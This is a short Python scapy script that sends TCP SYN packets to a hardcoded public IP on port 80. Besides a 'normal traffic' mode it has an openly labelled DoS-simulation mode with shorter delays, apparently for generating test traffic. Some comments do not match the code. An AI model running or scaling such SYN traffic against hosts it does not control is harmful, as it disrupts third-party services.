import random
from scapy.all import IP, TCP, send, time

target_ip = '20.163.104.229' # target ip
dest_port = 80               # target port
num_packets = 100            # number of packets to send to target ip

def send_syn_packet(target_ip):
    # random source port
    source_port = random.randint(1024, 65535)

    # create IP and TCP packets
    ip_packet = IP(dst=target_ip)  # Set the destination IP address
    tcp_packet = TCP(sport=source_port, dport=dest_port, flags='S')  # Set SYN flag

    # Construct the packet by combining IP and TCP packets
    packet = ip_packet / tcp_packet

    # Send the packet
    send(packet, verbose=False)  # Set verbose=False to suppress unnecessary output

def normalTraffic():
    try:
        # Send 10 SYN packets with random timing
        for _ in range(num_packets):
            send_syn_packet(target_ip)

            # Generate a random delay between 0.1 and 0.5 seconds
            delay = random.uniform(0.1, 0.5)  # Modify the delay range as desired

            # Pause execution for the random delay
            time.sleep(delay)
    except:
        print('-'*10)
        print("ERROR: YOU HAVE TO RUN THIS PROGRAM WITH ELEVATED PRIVILEGES!!")
        print("Exiting...")
        print('-'*10)
        quit(1)

# shorter delays for DOS-style traffic
def dosTraffic():
    try:
        for _ in range(num_packets):
            send_syn_packet(target_ip)

            # Generate a random delay between 0.1 and 0.5 seconds
            delay = random.uniform(0.02, 0.1)  # Modify the delay range as desired

            # Pause execution for the random delay
            time.sleep(delay)
    except:
        print('-'*10)
        print("ERROR: YOU HAVE TO RUN THIS PROGRAM WITH ELEVATED PRIVILEGES!!")
        print("Exiting...")
        print('-'*10)
        quit(1)


# main program
if __name__=="__main__":
    print("Application start...")
    print("* At any time, press \"Ctrl+C\" to exit the program!")
    while(True):
        print("Enter \"0\" to begin simulating a DOS attack OR")
        print("Enter \"1\" to simulate normal traffic")
        mode = int(input())
        print()

        if mode:
            print(f"NORMAL packet stream of {num_packets} packets...")
            normalTraffic()
        else:
            print(f"DOS packet stream of {num_packets} packets...")
            dosTraffic()
        print("Packet stream finished!\n")
